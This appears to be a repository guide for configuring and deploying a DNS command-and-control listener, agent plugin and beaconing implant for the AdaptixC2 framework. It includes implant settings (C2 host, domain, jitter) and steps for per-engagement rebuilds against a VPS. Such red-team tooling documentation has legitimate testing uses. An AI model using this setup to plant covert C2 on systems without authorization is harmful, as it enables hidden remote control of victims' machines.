# Adaptix Configuration for DNS C2

## Configuration Files in This Repo

### listener/config.yaml

```yaml
extender_type: "listener"
extender_file: "BeaconDNS.so"
ax_file: "ax_config.axs"
listener_name: "DNSC2"
listener_type: "external"
protocol: "DNS"
```

**Key Fields:**
- `listener_name` — must match name used in `dns_agent/config.yaml` and in GUI
- `extender_file` — compiled .so (relative to config.yaml)
- `ax_file` — AxScript form definition for GUI

### agent/config.yaml

```yaml
extender_type: "agent"
extender_file: "dns_agent.so"
ax_file: "ax_config.axs"
agent_name: "dns_agent"
agent_watermark: "d0c00001"
listeners:
  - "DNSC2"
multi_listeners: false
```

**Critical Fields:**

- **`agent_watermark`** — Must be exactly 8 lowercase hex digits (0-9a-f)
  - Used to verify agent authenticity during registration
  - If watermark in config doesn't match watermark used in `listener/dns_server.go` `TsAgentCreate()` call, registration silently fails (no error logged)
  - Example: "d0c00001" ✓ / "dns00001" ✗ (n, s not hex)

- **`listeners`** — List of listener names this agent supports
  - Must match `listener_name` from listener config.yaml
  - Example: "DNSC2" matches listener_name

- **`multi_listeners`** — Set to false (agent works with single listener)

### payload/include/config.h

```c
#ifndef CONFIG_H
#define CONFIG_H

#define C2_HOST    "192.168.67.128"   // Adaptix server IP
#define C2_PORT    5300               // Direct to listener
#define C2_DOMAIN  "c2.lab"           // Must match listener domain
#define AGENT_ID   "deadc0de"         // Unique 8 hex chars
#define SLEEP_MS   5000               // Heartbeat interval (lab: 5s, ops: 60s+)
#define JITTER_PCT 20                 // ±20% randomization

#endif
```

---

## Deploying to Adaptix Server

### 1. Build This Repo

```bash
cd listener && make
cd ../agent && make
cd ../payload && make
```

### 2. Copy to server-dist/

Assuming Adaptix at `/home/kali/AdaptixC2/AdaptixServer/`:

```bash
# Listener
sudo mkdir -p /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/BeaconDNS
sudo cp listener/dist/BeaconDNS.so \
        /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/BeaconDNS/
sudo cp listener/dist/config.yaml \
        /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/BeaconDNS/
sudo cp listener/dist/ax_config.axs \
        /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/BeaconDNS/

# Agent
sudo mkdir -p /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/dns_agent
sudo cp agent/dist/dns_agent.so \
        /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/dns_agent/
sudo cp agent/dist/config.yaml \
        /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/dns_agent/
sudo cp agent/dist/ax_config.axs \
        /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/dns_agent/
```

### 3. Verify profile.yaml

Check `/home/kali/AdaptixC2/AdaptixServer/server-dist/profile.yaml` includes both extenders:

```yaml
extenders:
  - "extenders/BeaconDNS/config.yaml"
  - "extenders/dns_agent/config.yaml"
  # ... other extenders
```

If missing, add them.

### 4. Restart Server

```bash
sudo pkill -f adaptixserver
cd /home/kali/AdaptixC2/AdaptixServer/server-dist
sudo ./adaptixserver -profile profile.yaml
```

Check startup:
```
[+] Starting server -> https://0.0.0.0:4321/endpoint
[+] The AdaptixC2 server is ready
```

No `[-]` errors for BeaconDNS or dns_agent.

---

## GUI Listener Creation

After server starts successfully:

1. **Adaptix Client** → **Listeners** tab
2. **Create Listener**
   ```
   Type:   DNSC2 (from dropdown, populated by BeaconDNS.so)
   Name:   My DNS Beacon (label only)
   Host:   0.0.0.0 (listen on all interfaces)
   Port:   5300 (where implant sends queries)
   Domain: c2.lab (in qname: <data>.agentid.c2.lab)
   ```
3. **Create** → Listener starts immediately

Verify port binding:
```bash
sudo netstat -ulnp | grep 5300
# Should show: udp  0  0  0.0.0.0:5300  0.0.0.0:*  adaptixserver
```

---

## Customizing for Real Operations

### Per-Engagement Implant Config

No Adaptix plugin changes needed. Only rebuild the implant:

```bash
cd payload/

# Edit config.h with engagement-specific values
cat > include/config.h <<EOF
#define C2_HOST    "1.2.3.4"          // VPS IP
#define C2_PORT    53                  // Standard DNS
#define C2_DOMAIN  "my-domain.com"     // Domain you control
#define AGENT_ID   "a3f9c142"          // Unique per implant
#define SLEEP_MS   60000               // 1-minute interval
#define JITTER_PCT 25
EOF

make
# dns_agent.exe ready for deployment
```

Listener/agent plugins remain the same across engagements.

---

## Configuration Errors

| Symptom | Cause | Fix |
|---------|-------|-----|
| Plugin fails to load ([-] error for BeaconDNS or dns_agent) | Go build ID mismatch | Rebuild both plugins with `make clean` + `make` in each dir, redeploy both .so files, restart server |
| Agent doesn't register | Watermark mismatch | Ensure `agent_watermark` in config.yaml exactly matches watermark in listener/dns_server.go TsAgentCreate() call |
| Agent doesn't register (no error logged) | Listener not running | Check GUI Listeners tab — listener must show "active" |
| Form fails to render | AxScript API mismatch | Check ax_config.axs uses v1.2.0 API: `form.create_textline()` not deprecated `form.create_lineedit()` |
| Port 5300 not listening | Listener creation failed | Check server log for errors; verify listener was created in GUI |

---

## Editing Config Files Without Rebuild

If you only change `config.yaml` or `ax_config.axs` (no Go source changed):

```bash
# Copy updated file
sudo cp listener/dist/config.yaml \
        /home/kali/AdaptixC2/AdaptixServer/server-dist/extenders/BeaconDNS/config.yaml

# Restart server (reads configs at startup)
sudo pkill -f adaptixserver
cd AdaptixServer/server-dist && sudo ./adaptixserver -profile profile.yaml
```

No `make` needed — these files are read at server startup, not compiled into binaries.

---

## AxScript API (v1.2.0)

In `listener/ax_config.axs` and `agent/ax_config.axs`, we use the v1.2.0 AxScript API.

### Command Definition

```javascript
let cmd = ax.create_command("name", "description", "example", "task_label");
cmd.addArgString("arg_name", required_or_default, "help");
cmd.addArgInt("arg_name", required_or_default);
cmd.addArgBool("flag_name");
cmd.addSubCommands([cmd1, cmd2]);
ax.create_commands_group("agent_name", [cmd]);
```

### Form Building

```javascript
let form = ax.create_form("form_id", "Form Title");
form.create_textline(default_value);  // Text input
let combo = form.create_combo(); combo.addItems(["opt1", "opt2"]);  // Dropdown
form.create_checkbox(default_bool);  // Boolean toggle
```

### Deprecated (v0.9, DO NOT USE)

```javascript
// ❌ WRONG
ax.create_arg()
form.create_lineedit()
form.create_combobox()
```

---

## Testing Config Without Full Adaptix

If you're testing the plugins standalone, you'll need to mock the Teamserver interface:

```go
type MockTeamserver struct {}

func (m *MockTeamserver) TsAgentCreate(agentCrc, agentId string, beat []byte, 
                                       listenerName, externalIP string, async bool) (adaptix.AgentData, error) {
  // Parse beat, return AgentData
  return adaptix.AgentData{
    ID: agentId,
    Hostname: "TESTHOST",
    // ... populate from beat
  }, nil
}

// ... implement other Teamserver methods as needed
```

Then in your test:

```go
ts := &MockTeamserver{}
listener := InitPlugin(ts, "./listener", "./listener")
// Test listener.Create(), listener.Start(), etc.
```

---

## Scaling: Multiple Listeners

To run multiple DNS listeners on different ports/domains:

1. Create separate listener instances in GUI:
   ```
   DNSC2-1: port 5300, domain c2.lab
   DNSC2-2: port 5301, domain c2-2.lab
   ```

2. Rebuild implant for each domain:
   ```bash
   # Implant 1
   C2_DOMAIN "c2.lab" → dns_agent_1.exe
   
   # Implant 2
   C2_DOMAIN "c2-2.lab" → dns_agent_2.exe
   ```

3. Each implant beacons to its respective listener

---

## Summary

- **listener/config.yaml** + **agent/config.yaml** — Adaptix plugin registration
- **payload/include/config.h** — Implant hardcoded config (per-engagement)
- **GUI Listeners tab** — Create listener instances (no rebuild needed)
- **No rebuild for engagement changes** — Only implant binary changes

The listener/agent plugins are domain/IP-agnostic. Only the implant is engagement-specific.
